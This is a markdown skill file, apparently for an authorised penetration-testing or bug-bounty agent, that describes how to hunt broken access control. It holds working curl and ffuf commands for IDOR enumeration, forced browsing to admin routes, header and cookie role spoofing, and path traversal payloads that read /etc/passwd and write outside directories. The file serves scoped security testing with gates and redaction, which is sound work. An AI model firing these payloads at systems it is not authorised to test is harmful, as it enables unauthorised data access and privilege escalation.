---
name: hunt-broken-access-control
description: >
  Hunt for broken access control: horizontal privilege escalation (access
  another same-tier user's data), vertical privilege escalation (access
  higher-tier functionality), path traversal to read/write outside the
  intended directory, and metadata/parameter manipulation (forced
  browsing, direct object reference by predictable ID). Use as the
  general-purpose authz survey across the whole app. Keywords: IDOR,
  horizontal access control, vertical access control, privilege
  escalation, path traversal, forced browsing, ../../, direct object
  reference.
  Do NOT use for API-specific BOLA/BFLA terminology survey when the target
  is purely an API — use hunt-api-abuse for that framing (same root cause,
  different surface). Do NOT use for mass-assignment-driven privilege
  escalation — use hunt-mass-assignment for the field-injection vector.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-22, CWE-284, CWE-285, CWE-639, CWE-862, CWE-863]
  mitre_attack: [T1548, T1083, T1083]
  tools: [burpsuite, ffuf, curl, "Autorize"]
depends_on: [active-recon, web-crawling]
feeds_into: [chain-analysis]
chains_with: [hunt-api-abuse, hunt-mass-assignment, hunt-business-logic]
---

## Signals

- Any resource referenced by an ID in the URL/body (`/invoice/1042`, `/user/55/edit`, `?file=report.pdf`).
- Role-gated UI elements (admin menu hidden by CSS/JS, not absent from the DOM/bundle).
- File download/view features taking a filename/path parameter.
- Multi-tenant app where tenant isolation depends on application logic rather than infrastructure-level separation.
- Different URL structures per role (`/admin/...` vs `/user/...`) that might share the same backend auth middleware — or might not.

## Prerequisites

- At least two accounts at the same privilege tier (horizontal testing) and at least two tiers (vertical testing) — all within scope.
- A documented map of every role-gated feature from crawling (hunt-web-crawling output) to test systematically, not just a few examples.

## Methodology

1. **Horizontal — direct object reference.** As User A, capture a request touching an owned object. Replay as User B against User A's object ID:
   ```bash
   curl -s -i https://target.com/invoice/1042 -b "session=$SESSION_USER_B"
   # 200 with User A's data = horizontal broken access control
   ```
   Script across a range to confirm scope/systemic nature:
   ```bash
   for id in $(seq 1030 1060); do
     code=$(curl -s -o /tmp/inv_$id.html -w "%{http_code}" https://target.com/invoice/$id -b "session=$SESSION_USER_B")
     echo "$id -> $code"
   done
   ```

2. **Horizontal — indirect/predictable reference.** If IDs are UUIDs (not sequential), check if any other identifier (order number, invoice reference, confirmation code) used as a lookup key is predictable/enumerable instead.

3. **Vertical — forced browsing to admin functionality.** Mine the JS bundle and sitemap for admin-only routes, then request them directly as a low-privilege user:
   ```bash
   curl -s https://target.com/static/js/main.js | grep -oE '"/admin/[a-zA-Z0-9/_-]+"' | sort -u
   curl -s -i https://target.com/admin/users -b "session=$SESSION_LOW_PRIV"
   curl -s -i https://target.com/admin/export -b "session=$SESSION_LOW_PRIV"
   ```
   Also brute-force common admin paths if nothing is visible client-side:
   ```bash
   ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -t 50
   ```

4. **Vertical — method/verb confusion on a role-gated endpoint.** If GET is blocked for low-privilege but the endpoint also accepts other verbs, test them:
   ```bash
   curl -s -i -X POST https://target.com/admin/users/55/promote -b "session=$SESSION_LOW_PRIV"
   curl -s -i -X PUT https://target.com/admin/users/55 -b "session=$SESSION_LOW_PRIV" -d '{"role":"admin"}'
   ```

5. **Path traversal — file read.** Test any filename/path parameter for directory traversal:
   ```bash
   curl -s "https://target.com/download?file=../../../../etc/passwd"
   curl -s "https://target.com/download?file=..%2f..%2f..%2f..%2fetc%2fpasswd"
   curl -s "https://target.com/download?file=....//....//....//etc/passwd"    # filter-bypass via repeated traversal
   curl -s "https://target.com/download?file=..\\..\\..\\windows\\win.ini"    # Windows-hosted target
   curl -s "https://target.com/static/..%252f..%252f..%252fetc%252fpasswd"     # double URL-encoding
   ```
   Confirm by checking for actual file content (`root:x:0:0:` for `/etc/passwd`), not just a 200 status.

6. **Path traversal — file write/overwrite.** If an upload or export feature accepts a destination path, test writing outside the intended directory (higher risk — only with explicit scope/gate, since this can be destructive):
   ```bash
   curl -s -i -X POST https://target.com/api/export -d '{"path":"../../../../tmp/poc_write_test.txt","content":"poc"}'
   ```

7. **Metadata/parameter manipulation.** Test hidden form fields and cookies/headers that encode role or permission client-side:
   ```bash
   curl -s -i https://target.com/profile -b "session=$SESSION; role=admin"
   curl -s -i https://target.com/api/me -H "X-Role: admin"
   curl -s -i https://target.com/api/me -H "X-User-Id: 1"
   ```

8. **Confirm the access control gap is enforced nowhere else in the chain** (not just the endpoint you tested) — check if a WAF/gateway happens to block it while the origin app itself remains vulnerable, which changes remediation guidance but not the underlying finding.

## Tooling

- Burp Suite + **Autorize** extension (automated multi-account replay across an entire crawl, flags discrepancies).
- `ffuf` for forced-browsing/path discovery.
- `curl` for precise, scriptable per-ID replay and traversal payload iteration.
- Source-mapped JS bundle review (manual `grep`) for hidden route discovery.

## Root Causes

- Authorization enforced client-side (hidden menu items) with no server-side re-check on the endpoint.
- Object lookups by ID with no ownership/tenant check (`WHERE id=?` instead of `WHERE id=? AND user_id=?`).
- Inconsistent middleware application — some routes wrapped in an auth-check decorator/middleware, newer routes added without it.
- Filenames/paths concatenated into filesystem calls without canonicalization or allow-listing against a base directory.
- Trust placed in client-controlled cookies/headers for role or identity.

## Validation Gate (minimum proof)

- Horizontal: request/response pair showing User B's session retrieving User A's specific, real (redacted in report) data.
- Vertical: request/response showing a low-privilege session executing/viewing admin-only functionality, with a follow-up request confirming any state change actually took effect.
- Path traversal: actual file content read from outside the intended directory (not just an unusual status code) — stop at read confirmation; do not escalate to write/overwrite without an operator gate.
- Every finding needs the full request+response, not a description of what "should" happen.

## Gotchas

- **Minimum proof:** a differing HTTP status code (200 vs 403) is a lead; confirm the response body contains real, exploitable content before calling it Demonstrated.
- **Common N/A:** object IDs are unguessable UUIDv4 AND every lookup is properly scoped to the authenticated user/tenant — verify both before closing, since UUIDs alone don't guarantee the ownership check exists.
- **Overclaim trap:** finding an admin route that still requires a valid admin session token (just reachable in terms of URL structure) is not vertical escalation — you must reach it with a *lower-privilege* session.
- Path traversal payloads blocked by a WAF at the edge doesn't mean the origin app sanitizes correctly — note whether you tested against the edge or confirmed direct origin access, where in scope.
- Don't confuse a 404 (object doesn't exist) with a 403 (exists but denied) when iterating object IDs — a 404 on someone else's object can also mean enumeration is simply hard, not that access control works; verify object existence independently where possible.

## Chains & Compositions

- Horizontal IDOR + sequential/predictable IDs → systemic mass data exposure (quantify scope without exfiltrating real data at bulk).
- Vertical escalation to admin → full chain into whatever admin functionality enables (user management, billing, data export) — treat each as its own impact statement.
- Path traversal read of a config file → credential/secret exposure feeding further chains (e.g. API keys enabling hunt-api-abuse elsewhere).
- Metadata/header-based role trust → often combines with hunt-mass-assignment if the same role value is also settable via a profile update endpoint.
